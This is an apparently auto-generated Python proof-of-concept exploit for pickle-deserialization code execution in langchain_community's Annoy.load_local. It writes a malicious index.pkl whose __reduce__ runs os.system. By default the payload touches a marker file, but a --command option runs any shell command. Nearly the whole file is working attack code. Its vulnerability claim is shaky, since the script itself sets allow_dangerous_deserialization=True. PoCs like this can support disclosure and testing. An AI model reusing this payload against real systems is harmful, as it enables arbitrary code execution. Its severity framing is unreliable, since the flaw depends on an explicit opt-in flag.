#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-021
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_37.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for langchain-community-only RCE via pickle deserialization.

Vulnerability: The load_local function in langchain_community/vectorstores/annoy.py
uses pickle.load on a file whose path is constructed from user-controlled folder_path.
The allow_dangerous_deserialization flag is a weak guard that can be set to True,
allowing arbitrary code execution via a malicious pickle file.

This PoC demonstrates the exploit by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Hosting it at a controlled path
3. Calling load_local with folder_path pointing to the malicious file and allow_dangerous_deserialization=True

Usage:
    python3 poc.py [--target http://localhost:8000] [--payload-dir /tmp/exploit]
"""

import argparse
import os
import pickle
import subprocess
import sys
import tempfile
import time
import requests

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
DEFAULT_TARGET = "http://localhost:8000"
DEFAULT_PAYLOAD_DIR = "/tmp/langchain_exploit"
BENIGN_COMMAND = "touch /tmp/poc_success.txt"

# ---------------------------------------------------------------------------
# Step 1: Create a malicious pickle file
# ---------------------------------------------------------------------------
def create_malicious_pickle(payload_dir: str, command: str) -> str:
    """
    Creates a pickle file that executes the given command when unpickled.
    Returns the path to the created pickle file.
    """
    # Ensure the directory exists
    os.makedirs(payload_dir, exist_ok=True)
    
    # Create a malicious class that executes a command on __reduce__
    class MaliciousPickle:
        def __reduce__(self):
            return (os.system, (command,))
    
    # Write the pickle file
    pickle_path = os.path.join(payload_dir, "index.pkl")
    with open(pickle_path, "wb") as f:
        pickle.dump(MaliciousPickle(), f)
    
    print(f"[+] Created malicious pickle file at: {pickle_path}")
    print(f"[+] Payload command: {command}")
    return pickle_path

# ---------------------------------------------------------------------------
# Step 2: Simulate the vulnerable function call
# ---------------------------------------------------------------------------
def trigger_exploit(target_url: str, folder_path: str) -> None:
    """
    Simulates calling the vulnerable load_local function with attacker-controlled
    folder_path and allow_dangerous_deserialization=True.
    
    In a real scenario, this would be called via an API endpoint that passes
    user input to load_local. Here we directly call the library function.
    """
    # Import the vulnerable module (assuming it's installed in the environment)
    try:
        from langchain_community.vectorstores.annoy import Annoy
    except ImportError:
        print("[-] langchain-community not installed. Install with: pip install langchain-community")
        sys.exit(1)
    
    # We need embeddings - use a simple mock or real embeddings
    # For PoC, we'll use a minimal embedding function
    class MockEmbeddings:
        def embed_query(self, text):
            return [0.0] * 100  # Dummy embedding
    
    embeddings = MockEmbeddings()
    
    print(f"[*] Calling load_local with folder_path='{folder_path}'")
    print(f"[*] allow_dangerous_deserialization=True")
    
    try:
        # This is the vulnerable call
        result = Annoy.load_local(
            folder_path=folder_path,
            embeddings=embeddings,
            allow_dangerous_deserialization=True
        )
        print(f"[+] load_local returned: {result}")
    except Exception as e:
        print(f"[!] Exception during load_local: {e}")
        # The exploit may still have executed before the exception
        # Check if the command was executed

# ---------------------------------------------------------------------------
# Step 3: Verify the exploit worked
# ---------------------------------------------------------------------------
def verify_exploit() -> bool:
    """
    Checks if the benign command was executed (touch /tmp/poc_success.txt).
    Returns True if the file exists.
    """
    marker_file = "/tmp/poc_success.txt"
    if os.path.exists(marker_file):
        print(f"[+] Exploit succeeded! Marker file exists: {marker_file}")
        return True
    else:
        print(f"[-] Marker file not found: {marker_file}")
        return False

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(description="PoC for langchain-community RCE via pickle deserialization")
    parser.add_argument("--target", default=DEFAULT_TARGET, help="Target URL (not used in direct call)")
    parser.add_argument("--payload-dir", default=DEFAULT_PAYLOAD_DIR, help="Directory to store malicious pickle")
    parser.add_argument("--command", default=BENIGN_COMMAND, help="Command to execute (default: touch /tmp/poc_success.txt)")
    args = parser.parse_args()
    
    print("[*] langchain-community RCE PoC")
    print("[*] ============================")
    
    # Step 1: Create malicious pickle
    pickle_path = create_malicious_pickle(args.payload_dir, args.command)
    
    # Step 2: Trigger the exploit
    trigger_exploit(args.target, args.payload_dir)
    
    # Step 3: Verify
    time.sleep(0.5)  # Give the command time to execute
    success = verify_exploit()
    
    if success:
        print("[+] PoC completed successfully!")
        print("[+] The vulnerability is confirmed exploitable.")
    else:
        print("[-] PoC did not detect successful exploitation.")
        print("[*] Check if the command was executed manually.")
    
    # Cleanup (optional)
    # os.remove(pickle_path)
    # os.remove("/tmp/poc_success.txt")

if __name__ == "__main__":
    main()
